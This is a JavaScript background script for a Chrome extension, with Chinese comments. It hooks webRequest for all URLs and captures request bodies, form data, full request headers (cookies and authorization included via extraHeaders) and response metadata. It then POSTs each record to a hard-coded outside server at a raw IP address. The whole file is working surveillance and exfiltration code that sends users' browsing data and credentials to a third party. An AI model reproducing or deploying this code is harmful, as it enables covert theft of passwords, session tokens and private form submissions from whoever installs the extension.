var CmonitorServer = "http://106.12.43.245:4579/";
// var CmonitorServer = "https:www.baidu.com";

// 启动时创建随机数
function RndNum(n){
    var rnd = "";
    for(var i = 0; i < n; i++)
        rnd += Math.floor(Math.random() * 10);
    return rnd;
}

function saveReqbody2Storage(InitId, requestId, requrl, method, initiator, bodyType, requestBody){
	var saveKey = InitId.toString() + requestId.toString();
	var existData = JSON.parse(sessionStorage.getItem(saveKey));
	// console.log(existData);
	if (existData) {
		existData['InitId'] = InitId;
		existData['requestId'] = requestId;
		existData['url'] = requrl;
		existData['method'] = method;
		existData['initiator'] = initiator;
	}else{
		var existData = {
			"InitId": InitId,
			"requestId": requestId,
			"url": requrl,
			"method": method,
			"initiator": initiator,
		};
	}
	if (bodyType != 'empty') {
		existData["bodyType"] = bodyType;
		existData["requestBody"] = requestBody;
		// existData["requestBody"] = requestBody;
		// console.log(existData['requestBody']);
	}else{
		existData["bodyType"] = bodyType;
	}

	sessionStorage.setItem(saveKey, JSON.stringify(existData));
}

function saveReqHeaders2Storage(InitId, requestId, reqHeaders){
	saveKey = InitId.toString() + requestId.toString();
	var existData = JSON.parse(sessionStorage.getItem(saveKey));
	// console.log(existData)
	if (existData) {
		saveReqHeadersDict = {};
		for (var i = reqHeaders.length - 1; i >= 0; i--) {
			saveReqHeadersDict[reqHeaders[i]['name']] = reqHeaders[i]['value'];
		}
		existData['reqHeaders'] = saveReqHeadersDict;
	}else{
		var existData = {}
		existData['reqHeaders'] = saveReqHeadersDict;
	}
	// console.log(reqHeaders);
	sessionStorage.setItem(saveKey, JSON.stringify(existData));
}

function getReqAndsendRespHeader2Server(InitId, requestId, resIp, statusCode, resHeaders){
	var saveKey = InitId.toString() + requestId.toString();
	var reqData = JSON.parse(sessionStorage.getItem(saveKey));
	reqData['resIp'] = resIp;
	reqData['statusCode'] = statusCode;
	// reqData.resHeaders = resHeaders;
	resHeadersDict = {};
	for (var i = 0; i < resHeaders.length; i++) {
		resHeadersDict[resHeaders[i]['name']] = resHeaders[i]['value'];
	}

	reqData['resHeaders'] = resHeadersDict;
	// console.log(reqData);
	sessionStorage.removeItem(saveKey);
	// console.log(reqData);
	// console.log(reqData["requestBody"]);
	// console.log(JSON.stringify(reqData));
	if (reqData['url'].indexOf('106.12.43.245') == -1 && reqData['url'].indexOf('twitter.com') == -1 && reqData['url'].indexOf('donot.me') == -1) {
		$.ajax({
			type: "POST",
			url: CmonitorServer + "Receive?InitId=" + InitId + "&requestId=" + requestId,
			data: JSON.stringify(reqData)
		});
	}
}


var InitId = RndNum(6);

chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
    	// || details.type == 'script'
        if (details.type == 'main_frame' || details.type == 'sub_frame' || details.type == 'xmlhttprequest' || details.type == 'other') {
	        var requestId = details.requestId;
			var requrl = details.url;
			var initiator = details.initiator;
			var method = details.method;
			// console.log(requestId + ":" + details.type);
			// 判断数据请求来源，排除插件引起的网络请求，避免死循环
			if (typeof initiator != 'string' || initiator.substr(0, 16) != 'chrome-extension') {
				// requestBody是object情况下才需要进行处理，不是object按照empty处理
				if (typeof details.requestBody === 'object') {
	        		if (details.requestBody.hasOwnProperty('formData')) {
	        			var requestBody = details.requestBody.formData;
	        			var bodyType = "formData";
		        	}
		        	if (details.requestBody.hasOwnProperty('raw')) {
		        		var requestBodyRaw = details.requestBody.raw;
		        		var bodyType = "raw";
	        			var dec = new TextDecoder("utf-8");
	        			var requestBody = "";
	        			for (var i = 0; i < requestBodyRaw.length; i++) {
	        				if (requestBodyRaw[i].hasOwnProperty('bytes')) {
	        					requestBody += dec.decode(requestBodyRaw[i].bytes);
	        					// console.log(requestBody[i]);
	        				}else{
	        					requestBody += requestBodyRaw[i].file;
	        					// console.log(requestBody[i]);
	        				}
		        		}
		        	}
		        	if (details.requestBody.hasOwnProperty('error')) {
		        		var bodyType = 'error';
		        	}
	        	}else{
	        		var bodyType = 'empty';
	        	}

	        	if (bodyType != 'empty' && bodyType != 'error' ) {
	        		saveReqbody2Storage(InitId, requestId, requrl, method, initiator, bodyType, requestBody);
	        	}else{
	        		saveReqbody2Storage(InitId, requestId, requrl, method, initiator, bodyType);
	        	}

			}else{
				// Done
			}

        }
    },
    {urls: ["<all_urls>"]}, 
    ["requestBody"]
);

chrome.webRequest.onSendHeaders.addListener(
	function(details){
		//  || details.type == 'script'
		// console.log(details);
		if (details.type == 'main_frame' || details.type == 'sub_frame' || details.type == 'xmlhttprequest' || details.type == 'other') {
			var requestId = details.requestId;
			var initiator = details.initiator;
			if (typeof initiator != 'string' || initiator.substr(0, 16) != 'chrome-extension'){
				saveReqHeaders2Storage(InitId, requestId, details.requestHeaders);

			}
		}
	},
	{urls: ["<all_urls>"]},
	['requestHeaders', 'extraHeaders']
);


chrome.webRequest.onBeforeRedirect.addListener(
    function(details) {
    	//  || details.type == 'script'
        if (details.type == 'main_frame' || details.type == 'sub_frame' || details.type == 'xmlhttprequest' || details.type == 'other') {
        	var requestId = details.requestId;
        	var initiator = details.initiator;
        	var resIp = details.ip;
        	var statusCode = details.statusCode;
        	if (typeof initiator != 'string' || initiator.substr(0, 16) != 'chrome-extension'){
        		// console.log(details.responseHeaders);
        		getReqAndsendRespHeader2Server(InitId, requestId, resIp, statusCode, details.responseHeaders);
        	}
        }
    },
	{urls: ['<all_urls>']},
	["responseHeaders", 'extraHeaders']
);


chrome.webRequest.onResponseStarted.addListener(
    function(details) {
    	//  || details.type == 'script'
        if (details.type == 'main_frame' || details.type == 'sub_frame' || details.type == 'xmlhttprequest' || details.type == 'other') {
        	var requestId = details.requestId;
        	var initiator = details.initiator;
        	var resIp = details.ip;
        	var statusCode = details.statusCode;
        	if (typeof initiator != 'string' || initiator.substr(0, 16) != 'chrome-extension'){
        		// console.log(details.responseHeaders);
        		getReqAndsendRespHeader2Server(InitId, requestId, resIp, statusCode, details.responseHeaders);
        	}
        }
    },
    {urls: ["<all_urls>"]}, 
    ["responseHeaders", 'extraHeaders']
);